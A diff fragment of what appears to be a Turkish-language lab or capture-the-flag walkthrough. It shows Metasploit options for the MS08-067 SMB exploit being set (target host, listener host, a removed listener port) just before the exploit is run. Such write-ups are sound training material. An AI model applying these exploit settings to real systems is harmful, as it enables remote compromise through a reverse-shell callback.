@@ -52,7 +52,6 @@ msf exploit(windows/smb/ms08_067_netapi) > show options
 ```
 set RHOSTS 10.129.227.181
 set LHOST 10.10.14.187
-set LPORT 4444
 ```
 
 Ve exploiti çalıştırdım:
